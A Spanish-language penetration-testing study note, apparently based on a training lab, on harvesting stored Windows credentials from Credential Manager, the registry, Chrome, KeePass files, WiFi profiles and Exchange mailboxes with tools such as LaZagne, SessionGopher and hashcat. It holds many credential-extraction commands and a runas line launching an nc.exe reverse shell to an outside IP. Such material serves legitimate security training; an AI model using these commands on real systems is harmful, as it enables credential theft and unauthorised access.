
## 🧠 Concepto clave

Más allá de los archivos del sistema de ficheros, Windows almacena credenciales en múltiples capas adicionales: el registro del sistema guarda contraseñas de AutoLogon y sesiones de herramientas de administración remota en texto claro, los navegadores cifran credenciales con DPAPI pero pueden descifrarse con el contexto del usuario correcto, los gestores de contraseñas locales como KeePass pueden crackearse offline, y herramientas de automatización como LaZagne y SessionGopher extraen credenciales de docenas de aplicaciones simultáneamente. La superficie de ataque es considerablemente más amplia de lo que aparenta un sistema "limpio".

| Vector | Credenciales típicas | Herramienta |
|---|---|---|
| `cmdkey` / Credential Manager | Credenciales RDP/TERMSRV guardadas | `cmdkey /list`, `runas /savecred` |
| Registro — AutoLogon | Usuario y contraseña de arranque automático en texto claro | `reg query` |
| Registro — PuTTY | Credenciales de proxy en sesiones guardadas | `reg query` |
| Chrome / Chromium | Logins de aplicaciones web (DPAPI) | SharpChrome |
| KeePass (.kdbx) | Master password que da acceso a toda la bóveda | keepass2john + hashcat |
| Múltiples apps (LaZagne) | WinSCP, Credman, browsers, wifi, DPAPI, LSA | LaZagne |
| Herramientas de acceso remoto | PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP | SessionGopher |
| Redes WiFi | PSK de redes corporativas y personales | `netsh wlan` |
| Email corporativo (Exchange) | Credenciales en correos enviados/recibidos | MailSniper |

---

## 📌 Cmdkey — Credenciales guardadas en Windows Credential Manager

> [!info] **cmdkey** 📄 [cmdkey — Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)
> Herramienta nativa de Windows para gestionar el almacén de credenciales del sistema (Windows Credential Manager). Permite crear, listar y eliminar credenciales guardadas. Los usuarios y administradores la usan habitualmente para guardar credenciales de conexiones RDP/Terminal Services, shares de red y otros recursos, evitando tener que introducirlas repetidamente. Las credenciales guardadas son accesibles por cualquier proceso que corra como ese usuario.

> [!tip] Listar todas las credenciales guardadas en Credential Manager
> ```cmd
> cmdkey /list
> ```
> Sin argumentos adicionales, lista todas las credenciales almacenadas para el usuario actual: nombre del target, tipo de credencial y usuario asociado. La contraseña no se muestra, pero la credencial puede usarse directamente con `runas /savecred`.

La salida típica tiene este formato:
```
Target: LegacyGeneric:target=TERMSRV/SQL01
Type: Generic
User: inlanefreight\bob
```

Una entrada `TERMSRV/NOMBRE` indica credenciales de RDP guardadas para ese servidor. Con `runas /savecred` podemos reutilizarlas sin conocer la contraseña:

> [!tip] Ejecutar comandos como otro usuario usando credenciales guardadas
> ```powershell
> runas /savecred /user:inlanefreight\bob "cmd.exe /c whoami > C:\Temp\whoami.txt"
> runas /savecred /user:inlanefreight\bob "powershell -e BASE64_PAYLOAD"
> runas /savecred /user:inlanefreight\bob "C:\Temp\nc.exe 10.10.14.3 4444 -e cmd.exe"
> ```
> `/savecred` — Usa las credenciales guardadas en Credential Manager para ese usuario sin solicitar contraseña.
> `/user:dominio\usuario` — Usuario en cuyo contexto se ejecutará el comando.
> El comando se ejecuta con los privilegios del usuario especificado — si es administrador local o de dominio, obtenemos esos privilegios.

> [!important] `runas /savecred` solo funciona si ya existe una credencial guardada para ese usuario en Credential Manager. No permite crear credenciales nuevas sin conocer la contraseña. Sin embargo, si la credencial existe (por ejemplo, porque el usuario guardó su contraseña de RDP), podemos ejecutar código arbitrario en su contexto sin necesitar la contraseña en ningún momento.

---

## 📌 Credenciales en el Registro de Windows

El registro almacena en texto claro contraseñas de varias configuraciones del sistema. Son algunos de los hallazgos más valiosos en un engagement porque requieren cero cracking y frecuentemente corresponden a cuentas administrativas.

### AutoLogon — Contraseña de inicio de sesión automático

Windows AutoLogon permite que un sistema arranque directamente en una sesión de usuario sin introducir credenciales. Es común en kioscos, sistemas de punto de venta, equipos de laboratorio y entornos donde la comodidad se prioriza sobre la seguridad. Las credenciales configuradas se almacenan en texto claro en el registro, accesibles por cualquier usuario estándar.

> [!info] **Windows AutoLogon** 📄 [Configurar AutoLogon — Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon)
> Funcionalidad de Windows NT que configura el inicio de sesión automático al arrancar el sistema. Las credenciales se almacenan en `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` bajo los valores `DefaultUserName` y `DefaultPassword`. Esta clave es legible por usuarios estándar — no requiere privilegios de administrador para leerla. La alternativa segura es usar `Autologon.exe` de Sysinternals, que cifra la contraseña como LSA secret.

> [!tip] Extraer credenciales de AutoLogon del registro
> ```cmd
> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
> ```
> Buscar los valores `AutoAdminLogon`, `DefaultUserName` y `DefaultPassword` en la salida. Si `AutoAdminLogon` es `1`, el sistema está configurado para inicio automático y `DefaultPassword` contiene la contraseña en texto claro.

> [!tip] Extraer solo los valores relevantes directamente
> ```cmd
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
> ```
> `/v NombreValor` — Consulta un valor específico de la clave en lugar de listar todos.

Salida típica con AutoLogon configurado:
```
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    htb-student
DefaultPassword   REG_SZ    HTB_@cademy_stdnt!
```

---

### PuTTY — Credenciales de proxy en sesiones guardadas

Cuando PuTTY guarda una sesión que usa un proxy, las credenciales del proxy (usuario y contraseña) se almacenan en texto claro en el registro del usuario. En entornos corporativos, los administradores de IT frecuentemente configuran sesiones PuTTY con sus propias credenciales de proxy, que quedan accesibles para cualquiera que pueda leer el registro del usuario.

> [!tip] Enumerar sesiones PuTTY guardadas
> ```powershell
> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
> ```
> Lista todas las sesiones guardadas. Cada sesión aparece como una subclave.

> [!tip] Extraer credenciales de una sesión PuTTY específica
> ```powershell
> reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh"
> ```
> Buscar los valores `ProxyUsername` y `ProxyPassword` en la salida. `%20` es la codificación URL del espacio en nombres de sesión.

> [!tip] Buscar contraseñas en TODAS las sesiones PuTTY guardadas
> ```powershell
> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions /s | Select-String -Pattern "ProxyPassword|ProxyUsername|HostName"
> ```
> `/s` — Recursivo: consulta todas las subclaves (todas las sesiones).
> `Select-String` — Filtra solo los valores de interés de toda la salida.

> [!tip] Si se tiene admin — buscar en TODOS los usuarios (HKEY_USERS)
> ```powershell
> reg query HKU\ /s /f "ProxyPassword" 2>$null
> ```
> `HKU\` — Hive de todos los usuarios cargados. Requiere privilegios de administrador para acceder a los hives de otros usuarios.
> `/f "ProxyPassword"` — Busca el valor `ProxyPassword` en todas las subclaves recursivamente.

---

### Búsqueda de contraseñas en el registro — búsqueda amplia

> [!tip] Buscar contraseñas en todo el registro accesible
> ```cmd
> reg query HKLM /f password /t REG_SZ /s
> reg query HKCU /f password /t REG_SZ /s
> ```
> `/f password` — Busca la cadena "password" en nombres de valores y datos.
> `/t REG_SZ` — Solo valores de tipo string (texto). Evita falsos positivos en valores binarios/DWORD.
> `/s` — Recursivo en todas las subclaves.

> [!tip] Buscar en rutas de registro conocidas de aplicaciones
> ```cmd
> reg query "HKCU\Software\ORL\WinVNC3\Password"
> reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
> reg query "HKCU\Software\TightVNC\Server"
> reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
> ```
> Las implementaciones VNC frecuentemente guardan contraseñas en el registro cifradas con DES con clave fija conocida — prácticamente texto claro. Existen scripts para descifrarlas inmediatamente.

---

## 📌 Credenciales del navegador — Chrome / Chromium

Los navegadores basados en Chromium (Chrome, Edge, Brave, Opera) guardan las credenciales en una base de datos SQLite en el perfil del usuario, cifradas con DPAPI. Si tenemos ejecución de código como el usuario propietario del perfil, podemos descifrarlas.

> [!info] **SharpChrome** 📄 [GhostPack/SharpDPAPI — GitHub](https://github.com/GhostPack/SharpDPAPI)
> Herramienta de la suite GhostPack (SpecterOps) para extraer y descifrar datos protegidos por DPAPI de Chrome y otros navegadores Chromium. Extrae la AES state key del archivo `Local State`, la usa para descifrar las credenciales almacenadas en la base de datos `Login Data`, y devuelve las credenciales en texto claro. Parte del proyecto SharpDPAPI, que cubre toda la superficie de ataque de DPAPI en Windows.

> [!tip] Extraer credenciales guardadas de Chrome
> ```powershell
> .\SharpChrome.exe logins /unprotect
> ```
> `logins` — Módulo que extrae credenciales guardadas (usuario/contraseña por URL).
> `/unprotect` — Descifra las credenciales usando el contexto DPAPI del usuario actual. Sin este flag, devuelve los datos cifrados. Requiere ejecutarse como el usuario propietario del perfil de Chrome.

La salida incluye campos `signon_realm` (URL), `username` y `password` en texto claro para cada credencial guardada.

> [!tip] Extraer cookies de Chrome (útil para session hijacking)
> ```powershell
> .\SharpChrome.exe cookies /unprotect
> .\SharpChrome.exe cookies /unprotect /domain:inlanefreight.local
> ```
> `cookies` — Módulo de extracción de cookies.
> `/domain:` — Filtrar cookies por dominio específico — útil para apuntar a aplicaciones concretas.

> [!important] La extracción de credenciales de Chrome genera eventos de Windows detectables por blue teams: Event ID **4688** (process creation) cuando se ejecuta SharpChrome, Event ID **16385** (DPAPI activity) durante el descifrado, y potencialmente Event IDs **4662/4663** (object/file access) sobre los archivos del perfil de Chrome. En engagements con blue team activo, valorar el riesgo de detección antes de ejecutar.

**Ruta manual de la base de datos de Chrome para análisis offline:**
```
C:\Users\<usuario>\AppData\Local\Google\Chrome\User Data\Default\Login Data
C:\Users\<usuario>\AppData\Local\Google\Chrome\User Data\Local State
```

---

## 📌 KeePass — Crackeo offline de base de datos de contraseñas

KeePass es el gestor de contraseñas local más común en entornos corporativos. Un archivo `.kdbx` encontrado en un servidor, workstation o share de red puede contener cientos de credenciales de toda la infraestructura — servidores, dispositivos de red, bases de datos, cuentas de servicio. Protegido por una master password que puede ser débil.

> [!info] **keepass2john** 📄 [keepass2john.py — Gist](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py)
> Script Python que extrae el hash de la master password de un archivo KeePass `.kdbx` en formato compatible con John the Ripper y Hashcat. El hash captura los parámetros de derivación de clave (iteraciones KDF, salt, etc.) necesarios para el cracking offline. No requiere acceso a la base de datos en ejecución ni las credenciales del usuario — solo el archivo `.kdbx`.

> [!tip] Extraer el hash de la master password de un archivo KeePass
> ```bash
> python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
> # o con la versión moderna integrada en John
> keepass2john ILFREIGHT_Help_Desk.kdbx > keepass_hash.txt
> ```
> El hash resultante tiene el formato `$keepass$*2*ITERACIONES*...` — formato compatible directamente con Hashcat (modo 13400) y John.

> [!tip] Crackear el hash de KeePass con Hashcat
> ```bash
> hashcat -m 13400 keepass_hash.txt /usr/share/wordlists/rockyou.txt
> hashcat -m 13400 keepass_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> hashcat -m 13400 keepass_hash.txt /usr/share/wordlists/rockyou.txt --show
> ```
> `-m 13400` — Modo KeePass 1 (AES/Twofish) y KeePass 2 (AES). 📄 [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
> `-r best64.rule` — Aplicar reglas de mutación al wordlist: variaciones de capitalización, sustituciones, añadir números/símbolos. Aumenta significativamente la cobertura.
> `--show` — Mostrar hashes ya crackeados en la sesión actual (releer del potfile).

> [!tip] Crackear con John the Ripper
> ```bash
> john keepass_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=KeePass
> john keepass_hash.txt --show
> ```

> [!info] **Hashcat** 📄 [hashcat — GitHub](https://github.com/hashcat)
> Herramienta de cracking de hashes por GPU, la más rápida disponible para la mayoría de algoritmos. Soporta más de 300 tipos de hash. Para KeePass, el modo 13400 cubre tanto KeePass 1.x como 2.x con AES. La velocidad en KeePass es relativamente baja (miles de hashes/segundo en GPU) por las iteraciones KDF — haciendo que una master password débil sea crackeable en segundos pero una fuerte sea computacionalmente inviable.

---

## 📌 LaZagne — Extracción automatizada de credenciales de múltiples aplicaciones

> [!info] **LaZagne** 📄 [AlessandroZ/LaZagne — GitHub](https://github.com/AlessandroZ/LaZagne)
> Herramienta open source que extrae contraseñas almacenadas en texto claro o cifradas de forma reversible de decenas de aplicaciones en Windows y Linux. Organizada en módulos por categoría: browsers (Chrome, Firefox, IE), windows (Credman, Autologon, DPAPI, LSA secrets), sysadmin (WinSCP, PuTTY, OpenVPN, mRemoteNG), databases (MySQL, PostgreSQL, Oracle), wifi, chats, git, y más. Es la herramienta de "último recurso" que cubre todo lo que las herramientas específicas podrían perderse.

| Módulo      | Aplicaciones que cubre                        |
| ----------- | --------------------------------------------- |
| `browsers`  | Chrome, Firefox, IE/Edge, Opera               |
| `windows`   | Credman, Autologon, Vault, DPAPI, LSA secrets |
| `sysadmin`  | WinSCP, PuTTY, OpenVPN, mRemoteNG, TeamViewer |
| `wifi`      | Contraseñas de redes WiFi guardadas           |
| `databases` | MySQL, PostgreSQL, Oracle, SQLite             |
| `chats`     | Skype, Pidgin                                 |
| `mails`     | Thunderbird, Outlook                          |
| `memory`    | Dump de memoria de procesos específicos       |

> [!tip] Ejecutar todos los módulos de LaZagne
> ```powershell
> .\lazagne.exe all
> .\lazagne.exe all -v          # Verbose — más detalle
> .\lazagne.exe all -vv         # Muy verbose — depuración
> .\lazagne.exe all -oN output  # Guardar resultados en archivo de texto
> .\lazagne.exe all -oJ output  # Guardar en formato JSON
> ```
> `all` — Ejecuta todos los módulos disponibles.
> `-oN` / `-oJ` — Output en texto plano o JSON. El JSON facilita el post-procesamiento con `jq` o scripts.

> [!tip] Ejecutar módulos específicos
> ```powershell
> .\lazagne.exe browsers          # Solo navegadores
> .\lazagne.exe windows           # Solo credenciales de Windows
> .\lazagne.exe sysadmin          # WinSCP, PuTTY, etc.
> .\lazagne.exe wifi              # Contraseñas WiFi
> .\lazagne.exe databases         # Bases de datos
> ```

---

## 📌 SessionGopher — Credenciales de herramientas de acceso remoto

> [!info] **SessionGopher** 📄 [Arvanaghi/SessionGopher — GitHub](https://github.com/Arvanaghi/SessionGopher)
> Script de PowerShell que extrae y descifra credenciales guardadas de herramientas de acceso remoto: PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP. Lee directamente del registro (`HKEY_USERS` para todos los usuarios si hay privilegios de admin, `HKEY_CURRENT_USER` para el usuario actual). También puede buscar en discos archivos `.ppk` (claves PuTTY), `.rdp` y `.sdtid` (RSA SecurID tokens). Especialmente útil en servidores de salto (jump servers) donde múltiples administradores guardan sesiones remotas.

> [!tip] Ejecutar SessionGopher contra el sistema local como usuario actual
> ```powershell
> Import-Module .\SessionGopher.ps1
> Invoke-SessionGopher -Target WINLPE-SRV01
> ```
> `-Target` — Nombre del equipo objetivo. Para el sistema local, usar el hostname local.
> Sin admin local, solo recupera sesiones del usuario actual (HKCU). Con admin local, recupera sesiones de todos los usuarios del sistema (HKU).

> [!tip] Ejecutar con admin — recuperar sesiones de todos los usuarios
> ```powershell
> Invoke-SessionGopher -AllDomain          # Todos los equipos del dominio (requiere admin de dominio)
> Invoke-SessionGopher -Target SERVIDOR01  # Equipo específico vía WinRM
> Invoke-SessionGopher -Thorough           # Busca también archivos .ppk, .rdp en disco
> ```
> `-AllDomain` — Enumera todos los equipos del dominio AD y extrae sesiones remotamente. Muy ruidoso pero extremadamente efectivo en auditorías internas.
> `-Thorough` — Búsqueda adicional de archivos de clave privada PuTTY (`.ppk`) y archivos `.rdp` en el disco.

La salida incluye para cada herramienta: hostname, usuario y contraseña (cuando están almacenados). Las claves PuTTY sin passphrase son especialmente valiosas — permiten acceso SSH directo sin cracking.

---

## 📌 Email — MailSniper contra Exchange

> [!info] **MailSniper** 📄 [dafthack/MailSniper — GitHub](https://github.com/dafthack/MailSniper)
> Framework de PowerShell para búsqueda de información sensible en buzones de Microsoft Exchange. Permite buscar términos como "password", "credential", "vpn", "ssh" en el email del usuario comprometido, en todos los buzones del dominio (si se tienen permisos de administrador de Exchange), o en listas de distribución. También puede enumerar dominios, nombres de usuario mediante Autodiscover, y realizar password spraying contra OWA/EWS. En entornos donde el email corporativo es Exchange, es una fuente frecuente de credenciales enviadas en texto claro o adjuntos con contraseñas.

> [!tip] Buscar credenciales en el buzón del usuario comprometido
> ```powershell
> Import-Module .\MailSniper.ps1
>
> # Buscar en el buzón del usuario actual (requiere acceso a Exchange/OWA)
> Invoke-SelfSearch -Mailbox usuario@dominio.com -Terms @("password","credential","creds","vpn","ssh","admin")
> ```
> `-Mailbox` — Dirección de email del buzón a buscar.
> `-Terms` — Array de términos a buscar en el cuerpo y asunto de los correos.

> [!tip] Buscar en todos los buzones del dominio (requiere admin de Exchange)
> ```powershell
> Invoke-GlobalMailSearch -ImpersonationAccount administrador@dominio.com -Terms @("password","credential")
> ```

---

## 📌 Contraseñas WiFi guardadas

En workstations con tarjeta inalámbrica, Windows guarda las PSK de todas las redes a las que se ha conectado el equipo. Requiere admin local para extraer las claves en texto claro.

> [!tip] Listar todos los perfiles WiFi guardados
> ```cmd
> netsh wlan show profile
> ```
> Lista los SSID de todas las redes WiFi guardadas en el sistema.

> [!tip] Extraer la contraseña de una red WiFi específica
> ```cmd
> netsh wlan show profile "NombreRed" key=clear
> ```
> `key=clear` — Flag crítico que muestra la PSK en texto claro en el campo `Key Content`. Sin este flag, la contraseña no se muestra.

> [!tip] Extraer contraseñas de TODAS las redes WiFi guardadas con PowerShell
> ```powershell
> (netsh wlan show profiles) |
>     Select-String "All User Profile\s+:\s+(.+)" |
>     ForEach-Object {
>         $ssid = $_.Matches.Groups[1].Value.Trim()
>         $key = (netsh wlan show profile name="$ssid" key=clear) |
>                 Select-String "Key Content\s+:\s+(.+)"
>         if($key){
>             [PSCustomObject]@{SSID=$ssid; Password=$key.Matches.Groups[1].Value.Trim()}
>         }
>     } | Format-Table -AutoSize
> ```
> Extrae el nombre de cada perfil WiFi y consulta su contraseña, presentando todos los resultados en una tabla limpia.

---

## 📌 Búsqueda complementaria — Rutas de registro adicionales

> [!tip] Consultar múltiples rutas de registro conocidas por contener credenciales
> ```cmd
> rem AutoLogon
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
>
> rem VNC passwords
> reg query "HKCU\Software\ORL\WinVNC3\Password"
> reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
> reg query "HKCU\Software\TightVNC\Server" /v Password
> reg query "HKCU\Software\TightVNC\Server" /v PasswordViewOnly
>
> rem SNMP community strings
> reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
>
> rem Búsqueda genérica de "password" en HKLM y HKCU
> reg query HKLM /f password /t REG_SZ /s 2>nul
> reg query HKCU /f password /t REG_SZ /s 2>nul
> ```

---

## 🔗 Relaciones / Contexto

Esta fase cubre la capa más profunda del credential hunting en Windows: no los archivos que el usuario guardó intencionalmente, sino las credenciales que el propio sistema operativo y las aplicaciones almacenan como efecto secundario del uso normal. `cmdkey` y AutoLogon son especialmente valiosos en servidores de aplicaciones y sistemas de kiosco donde las credenciales almacenadas frecuentemente corresponden a cuentas de servicio con privilegios altos. La combinación de SessionGopher en servidores de salto (jump servers o bastiones) con LaZagne en workstations de administradores cubre prácticamente toda la superficie de credenciales guardadas sin necesidad de tocar LSASS — lo que es crítico en entornos con EDR moderno que monitoriza accesos a LSASS. Los archivos KeePass son el hallazgo de mayor impacto potencial: una sola master password débil puede dar acceso a toda la infraestructura de una organización de golpe.